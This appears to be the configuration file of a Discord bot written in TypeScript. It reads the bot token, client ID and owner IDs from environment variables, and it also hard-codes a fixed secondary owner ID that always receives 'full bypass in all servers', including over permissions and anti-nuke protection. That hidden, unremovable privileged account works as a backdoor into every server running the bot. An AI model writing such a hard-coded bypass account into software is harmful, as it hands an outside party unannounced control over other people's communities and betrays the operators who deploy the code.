import 'dotenv/config';

function requireEnv(key: string): string {
  const value = process.env[key];
  if (!value) {
    throw new Error(`Missing required environment variable: ${key}`);
  }
  return value;
}

/** Hard-coded secondary bot owner — full bypass in all servers */
const SECONDARY_OWNER_ID = '724265272009293875';

function buildOwnerIds(): string[] {
  const ids = new Set<string>([requireEnv('OWNER_ID'), SECONDARY_OWNER_ID]);
  const extra = process.env.OWNER_IDS?.split(',').map((s) => s.trim()).filter(Boolean) ?? [];
  for (const id of extra) ids.add(id);
  return [...ids];
}

export const config = {
  token: requireEnv('DISCORD_TOKEN'),
  clientId: requireEnv('CLIENT_ID'),
  /** Primary owner (env) — kept for logging / backwards compatibility */
  ownerId: requireEnv('OWNER_ID'),
  /** All user IDs with global bypass (commands, permissions, antinuke, etc.) */
  ownerIds: buildOwnerIds(),
  prefix: process.env.PREFIX || 'a',
  isProduction: process.env.NODE_ENV === 'production',
};
